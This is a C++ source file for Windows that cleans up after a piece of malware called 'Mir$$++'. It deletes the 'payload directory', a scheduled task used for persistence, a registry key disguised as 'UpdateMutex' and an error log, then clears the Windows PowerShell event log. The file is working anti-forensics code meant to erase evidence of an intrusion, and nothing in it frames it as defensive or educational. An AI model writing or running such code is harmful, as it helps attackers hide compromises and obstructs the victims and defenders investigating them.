// cleanup.cpp

#include <windows.h>
#include <shlwapi.h>
#include <iostream>
#include <string>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

void DeleteFolder(const std::wstring& path) {
    std::wstring cmd = L"rmdir /S /Q \"" + path + L"\"";
    _wsystem(cmd.c_str());
}

void DeleteFileIfExists(const std::wstring& path) {
    DeleteFileW(path.c_str()); // Will silently fail if file doesn't exist
}

void DeleteScheduledTask(const std::wstring& taskName) {
    std::wstring cmd = L"schtasks /Delete /TN \"" + taskName + L"\" /F >nul 2>&1";
    _wsystem(cmd.c_str());
}

void DeleteRegistryKey(HKEY root, const std::wstring& subkey) {
    SHDeleteKeyW(root, subkey.c_str()); // Will silently fail if key doesn't exist
}

void ClearPowerShellLog() {
    HANDLE hLog = OpenEventLogW(NULL, L"Windows PowerShell");
    if (hLog) {
        ClearEventLogW(hLog, NULL);
        CloseEventLog(hLog);
    }
}

int wmain() {
    std::wstring basePath = L"C:\\ProgramData\\Mir$$++";
    std::wstring logFile = basePath + L"\\error.log";

    std::wcout << L"[*] Cleaning up Mir$$++ traces..." << std::endl;

    // Delete payload directory
    DeleteFolder(basePath);

    // Delete scheduled task
    DeleteScheduledTask(L"Mir$$_Update");

    // Delete mutex registry key
    DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\UpdateMutex");

    // Delete error log if exists
    DeleteFileIfExists(logFile);

    // Clear PowerShell event log
    ClearPowerShellLog();

    std::wcout << L"[+] Cleanup complete." << std::endl;
    return 0;
}
